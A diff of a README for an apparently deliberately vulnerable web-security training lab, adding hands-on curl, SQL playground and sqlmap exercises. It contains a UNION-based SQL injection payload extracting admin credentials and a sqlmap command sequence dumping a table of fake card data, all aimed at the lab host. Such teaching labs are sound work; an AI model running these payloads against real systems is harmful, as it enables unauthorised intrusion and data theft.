@@ -92,7 +92,8 @@ ssh thaimart-lab
 | Lab 03 - SQL Playground | http://10.10.61.87/lab03 |
 | Lab 04 - Seller Portal (SQLi) | http://10.10.61.87/lab04 |
 | Lab 05 - Staff Directory (SQLi) | http://10.10.61.87/lab05 |
-| Lab 06 - Categories (SQLmap) | http://10.10.61.87/lab06?id=1 |
+| Lab 06 - SQLmap (Instructions) | http://10.10.61.87/lab06 |
+| Lab 06 - SQLmap (Target) | http://10.10.61.87/lab06?id=1 |
 | Lab 07 - Product Search (XSS) | http://10.10.61.87/lab07 |
 | Lab 08 - Member Search (XSS) | http://10.10.61.87/lab08 |
 | Lab 09 - Reviews (Stored XSS) | http://10.10.61.87/lab09 |
@@ -164,7 +165,8 @@ ThaiMart-Labs/
 │   │       ├── lab03.ejs
 │   │       ├── lab04-*.ejs
 │   │       ├── lab05.ejs
-│   │       ├── lab06.ejs
+│   │       ├── lab06.ejs           # Instructions page
+│   │       ├── lab06-target.ejs    # Vulnerable target page
 │   │       ├── lab07.ejs
 │   │       ├── lab08-*.ejs
 │   │       ├── lab09.ejs
@@ -180,11 +182,21 @@ ThaiMart-Labs/
 
 ## Labs Detail
 
-### Lab 01: HTTP Methods
+### Lab 01: HTTP Methods (Terminal-First)
 - **Path:** `/lab01`
 - **Story:** ThaiMart Developer Portal - API Tester
 - **Concept:** GET, POST, PUT, DELETE methods
+- **Mode:** Terminal-first (students use curl commands)
 - **Vulnerable:** No
+- **How it works:**
+  - Page shows curl command reference with copy buttons
+  - Students must open terminal and type commands themselves
+  - API endpoint: `/lab01/api/test` returns JSON with request details
+- **Example commands:**
+  ```bash
+  curl http://10.10.61.87/lab01/api/test
+  curl -X POST http://10.10.61.87/lab01/api/test -H "Content-Type: application/json" -d '{"name":"test"}'
+  ```
 
 ### Lab 02: Stateless Demo
 - **Path:** `/lab02`
@@ -193,11 +205,19 @@ ThaiMart-Labs/
 - **Concept:** Cookies, session, stateless HTTP
 - **Vulnerable:** No
 
-### Lab 03: SQL Playground
+### Lab 03: SQL Playground (Type SQL Yourself)
 - **Path:** `/lab03`
-- **Story:** Employee DB Explorer (Internal)
+- **Story:** Internal SQL Explorer
 - **Concept:** SQL commands (SELECT, INSERT, UPDATE, DELETE)
-- **Vulnerable:** No (educational only)
+- **Mode:** Hands-on (students type SQL in textarea)
+- **Vulnerable:** No (blocked: DROP, TRUNCATE, ALTER, CREATE, GRANT, REVOKE)
+- **How it works:**
+  - Single textarea for typing SQL queries
+  - Run button executes query against `playground_products` table
+  - Reset Table button restores seed data
+  - Clickable examples populate the textarea
+  - Right panel shows current table data
+- **Table schema:** `playground_products (id, name, price, stock, category)`
 
 ### Lab 04: Auth Bypass
 - **Path:** `/lab04`
@@ -219,11 +239,29 @@ ThaiMart-Labs/
   6. `' UNION SELECT 1,username,password_hash,role FROM admin_credentials--`
 - **Hidden Data:** admin_credentials table with superadmin account
 
-### Lab 06: SQLmap Target
-- **Path:** `/lab06?id=1`
+### Lab 06: SQLmap Target (Terminal-First)
+- **Path:** `/lab06` (instructions) or `/lab06?id=1` (target)
 - **Story:** Product Category Page
+- **Mode:** Terminal-first (students use sqlmap commands)
 - **Vulnerable:** YES - Numeric SQL Injection
-- **Attack:** `sqlmap -u "http://TARGET/lab06?id=1" --dbs`
+- **How it works:**
+  - `/lab06` shows instruction page with sqlmap commands
+  - `/lab06?id=1` shows vulnerable target page
+  - Students run sqlmap from terminal
+- **Attack commands:**
+  ```bash
+  # Step 1: Detect injection
+  sqlmap -u "http://10.10.61.87/lab06?id=1" --batch
+
+  # Step 2: List databases
+  sqlmap -u "http://10.10.61.87/lab06?id=1" --dbs --batch
+
+  # Step 3: List tables
+  sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart --tables --batch
+
+  # Step 4: Dump secret table
+  sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart -T secret_orders --dump --batch
+  ```
 - **Hidden Data:** secret_orders table with fake credit cards
 
 ### Lab 07: Reflected XSS
@@ -300,4 +338,4 @@ ssh -J root-agent@100.107.182.15 asdf@10.10.61.87 "cd ~/ThaiMart-Labs && sudo do
 
 ---
 
-*Last Updated: 2026-04-18*
+*Last Updated: 2026-04-18 (Labs 01, 03, 06 updated to hands-on mode)*
